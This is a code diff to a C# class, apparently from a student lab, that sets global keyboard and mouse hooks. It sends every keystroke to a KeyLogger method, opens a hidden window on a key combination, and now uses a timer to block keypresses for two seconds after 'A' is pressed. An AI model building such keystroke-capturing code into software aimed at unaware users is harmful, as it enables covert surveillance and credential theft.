@@ -15,7 +15,8 @@ namespace Laba_8
         private readonly Logger _logger;
         private readonly Settings _settings;
         private readonly WindowShowHandler _windowShow;
-        private readonly Stopwatch _tick;
+        private  System.Threading.Timer timer;
+        public static bool flag = true;
 
         public GlobalHooks(Settings config, WindowShowHandler windowShow)
         {
@@ -24,7 +25,6 @@ namespace Laba_8
             _logger = new Logger(_settings);
             _globalHooks.KeyDown += KeyEvent;
             _globalHooks.MouseClick += MouseEvent;
-            _tick = new Stopwatch();
         }
         private void KeyEvent(object sender, KeyEventArgs e)
         {
@@ -32,19 +32,10 @@ namespace Laba_8
             {
                 if (e.KeyData == (Keys.A))
                 {
-                    _tick.Restart();
+                    flag = false;
+                    timer = new System.Threading.Timer(TimerSuka, null, 2000, 0);
                 }
-
-                if (_tick.IsRunning && _tick.Elapsed.Seconds < 2)
-                {
-                    e.SuppressKeyPress = true;
-                }
-
-                if (_tick.IsRunning && _tick.Elapsed.Seconds > 2)
-                {
-                    _tick.Stop();
-                }
-
+                e.SuppressKeyPress = flag ?  false : true;
                 _logger.KeyLogger(e.KeyData.ToString());
             }
             if (e.KeyData == (Keys.Control | Keys.Shift | Keys.Tab))
@@ -54,6 +45,11 @@ namespace Laba_8
                     _windowShow.Invoke();
                 }
             }
+        }
+
+        public static void TimerSuka(object e)
+        {
+            flag = true;
         }
 
         private void MouseEvent(object sender, MouseEventArgs e)
